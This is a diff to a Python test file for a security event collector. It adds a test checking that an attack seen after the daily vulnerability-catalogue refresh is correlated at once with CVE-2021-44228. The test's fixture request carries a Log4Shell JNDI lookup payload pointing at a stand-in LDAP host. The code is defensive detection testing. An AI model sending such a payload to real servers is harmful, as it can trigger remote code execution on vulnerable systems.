@@ -13,6 +13,7 @@ from shield.collector.repositories import InMemoryEventRepository
 from shield.collector.watch import (
     SIGNATURES,
     build_entries,
+    correlate,
     fetch_kev,
     refresh,
     seconds_until,
@@ -81,6 +82,20 @@ async def test_une_cve_observee_chez_nous():
     [first, *_] = await repo.watch_entries()
     assert first["cve_id"] == "CVE-2021-44228"
     assert first["matched_events"] == 1
+
+
+async def test_une_attaque_posterieure_au_passage_quotidien_est_correlee():
+    """La corrélation tourne entre deux passages quotidiens : pas d'attente jusqu'à 4 h."""
+    repo = InMemoryEventRepository()
+
+    async def fetch():
+        return KEV
+
+    assert await refresh(repo, fetch) == 0
+    await store(repo, b"GET /?x=${jndi:ldap://198.51.100.9/a} HTTP/1.1")
+    assert await correlate(repo) == 1
+    entries = {entry["cve_id"]: entry for entry in await repo.watch_entries()}
+    assert entries["CVE-2021-44228"]["matched_events"] == 1
 
 
 async def test_catalogue_injoignable_sans_effet():
